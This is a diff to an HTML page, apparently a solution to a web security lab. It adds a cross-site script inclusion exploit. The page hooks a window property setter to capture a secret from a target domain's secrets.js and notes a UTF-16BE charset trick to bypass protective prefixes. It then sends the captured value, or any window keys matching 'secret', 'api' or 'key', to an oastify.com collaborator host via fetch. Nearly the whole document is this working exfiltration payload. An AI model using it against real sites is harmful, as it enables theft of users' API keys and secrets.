@@ -1,13 +1,54 @@
+<!DOCTYPE html>
 <html>
-
-<head>
-    <meta charset="utf8" />
-    <title>Frame embeded with malware :P</title>
-</head>
-
 <body>
-    <p>iframe element with malicious code</p>
-    <script type="text/javascript" src="test.js"></script>
-</body>
+    <!-- 
+      1. DEFINE A SETTER 
+      This script attempts to intercept a global variable assignment.
+      Replace 'secretVariableName' with the actual variable name found in secrets.js 
+      (e.g., 'apiKey', 'secret', 'data').
+    -->
+    <script>
+        var stolenData = "";
+        
+        Object.defineProperty(window, 'secretVariableName', {
+            set: function(val) {
+                stolenData = val;
+            }
+        });
+    </script>
 
+    <!-- 
+      2. BYPASS PROTECTION (OPTIONAL)
+      If secrets.js starts with a syntax-breaking prefix like )]}', 
+      uncomment the line below to force UTF-16BE interpretation.
+      This often bypasses the prefix by interpreting bytes differently.
+    -->
+    <!-- <meta charset="UTF-16BE"> -->
+
+    <!-- 
+      3. INCLUDE THE VULNERABLE SCRIPT 
+      This executes the code from the target domain in your context.
+    -->
+    <script src="https://ptl-fa1bb21ced03-32651dfe4fdc.libcurl.me/secrets.js"></script>
+
+    <!-- 
+      4. EXFILTRATE THE DATA
+      Send the captured data to your Exploit Server.
+    -->
+    <script>
+        if (stolenData) {
+            // Change URL to your specific exploit server URL
+            fetch('https://23395rn9o57k710x0nsrwmydh4nvbnzc.oastify.com/exploit?data=' + encodeURIComponent(stolenData));
+        } else {
+            // Fallback: If you don't know the variable name, try to find new properties on window
+            // This is noisy but effective for finding the secret
+            var keys = Object.keys(window);
+            var data = keys.filter(k => k.indexOf('secret') > -1 || k.indexOf('api') > -1 || k.indexOf('key') > -1)
+                           .map(k => k + "=" + window[k]).join('&');
+            if (data) {
+                 fetch('https://23395rn9o57k710x0nsrwmydh4nvbnzc.oastify.com/exploit?' + data);
+            }
+        }
+    </script>
+</body>
 </html>
